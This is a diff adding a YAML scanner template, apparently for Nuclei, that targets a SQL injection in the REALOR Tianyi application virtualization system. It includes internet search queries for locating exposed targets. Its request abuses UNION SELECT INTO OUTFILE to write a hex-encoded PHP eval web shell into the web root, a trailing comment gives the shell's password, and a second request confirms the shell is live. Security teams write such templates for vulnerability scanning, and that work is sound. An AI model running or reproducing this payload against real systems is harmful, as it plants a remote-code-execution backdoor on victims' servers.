@@ -1,0 +1,41 @@
+id: realor_console_external_api_sqli
+info:
+  name: REALOR-天翼应用虚拟化系统SQL注入
+  author: Xc1Ym,chalan630
+  severity: critical
+  description: REALOR-天翼应用虚拟化系统 ConsoleExternalApi.XGI 接口存在SQL注入
+  metadata:
+    max-request: 1
+    fofa-query: app="REALOR-天翼应用虚拟化系统"
+    hunter-query: app.name="REALOR 瑞友天翼虚拟化平台"
+    quake-query: app:"瑞友天翼应用虚拟化系统"
+    verified: true
+  tags: sqli,realor,hw,intrusive
+
+http:
+  - raw:
+      - |
+        POST /ConsoleExternalApi.XGI?iDisplayStart=1+union+select+1,2,3,4,5,unhex%28%277161786e623c3f70687020636c617373204739413674353551207b207075626c69632066756e6374696f6e205f5f636f6e73747275637428244873743857297b20406576616c28222f2a5a384f313336656170632a2f222e2448737438572e2222293b207d7d6e657720473941367435355128245f524551554553545b277161786e62275d293b3f3e%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cqaxnb.XGI%27%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 178
+
+        initParams=command_getAppVisitLogByDataTable__user_admin__pwd_xxx__serverIdStr_1&key=inner&sign=0a3d5f4f69628f32217ea9704d12bd6d
+      - |
+        GET /qaxnb.XGI HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+    - type: dsl
+      dsl:
+        - status_code_1==200
+        - status_code_2==200
+        - contains(body_2, 'qaxnb')
+      condition: and
+
+# shell pass:qaxnb
+# digest: 4b0a0048304602210098b2fa822b0b50f486a79f64727358f92bff3a01fea1d072a9578f46e4221e5b022100de6d28a14e26f159b0dafcabafebe5ed6b81099274e3a519cde1afb0d4f93a5f:6b2dd5af372f02ed15a56faf8ad98cf9
